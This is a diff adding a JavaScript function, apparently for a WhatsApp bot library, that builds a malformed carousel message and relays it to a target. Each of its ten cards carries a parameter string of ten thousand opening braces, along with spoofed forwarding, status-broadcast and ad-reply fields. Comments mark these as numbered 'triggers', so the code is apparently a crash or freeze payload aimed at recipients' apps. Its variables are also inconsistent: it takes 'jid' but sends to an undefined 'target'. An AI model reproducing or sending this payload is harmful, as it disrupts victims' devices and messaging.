@@ -1,0 +1,89 @@
+async function MsgSql(jid) {
+  const cards = [];
+  
+  const media = await prepareWAMessageMedia(
+    { video: { url: 'https://files.catbox.moe/dfb42j.mp4' }, 
+    },
+    { upload: frmn.waUploadToServer }
+  );
+
+  const header = {
+    videoMessage: media.videoMessage,
+    hasMediaAttachment: false,
+    contextInfo: {
+      forwardingScore: 666,
+      isForwarded: true,
+      stanzaId: "" + Date.now(),
+      participant: "0@s.whatsapp.net",
+      remoteJid: "status@broadcast",
+      quotedMessage: {
+        extendedTextMessage: {
+          text: "🥶 𝐕𝐄𝐑𝐒𝐄𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 🥶",
+          contextInfo: {
+            mentionedJid: ["13135550002@s.whatsapp.net"],
+            externalAdReply: {
+              title: "",
+              body: "",
+              thumbnailUrl: "",
+              mediaType: 1,
+              sourceUrl: "https://t.me/VerseNotDev",
+              showAdAttribution: false // trigger 1
+            }
+          }
+        }
+      }
+    }
+  };
+
+  for (let i = 0; i < 10; i++) {
+    cards.push({
+      header,
+      nativeFlowMessage: {
+        messageParamsJson: "{".repeat(10000) // trigger 2
+      }
+    });
+  }
+
+  const msg = generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            body: {
+              text: "🔥 𝐕𝐄𝐑𝐒𝐄𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 🔥"
+            },
+            carouselMessage: {
+              cards,
+              messageVersion: 1
+            },
+            contextInfo: {
+              businessMessageForwardInfo: {
+                businessOwnerJid: "13135550002@s.whatsapp.net"
+              },
+              stanzaId: "" + "" + Math.floor(Math.random() * 99999), // trigger 3
+              forwardingScore: 100,
+              isForwarded: true,
+              mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
+              externalAdReply: {
+                title: "",
+                body: "",
+                thumbnailUrl: "https://example.com/",
+                mediaType: 1,
+                mediaUrl: "",
+                sourceUrl: "https://t.me/VerseNotDev",
+                showAdAttribution: false
+              }
+            }
+          }
+        }
+      }
+    },
+    {}
+  );
+
+  await sock.relayMessage(target, msg.message, {
+    participant: { jid: target },
+    messageId: msg.key.id
+  });
+}                       
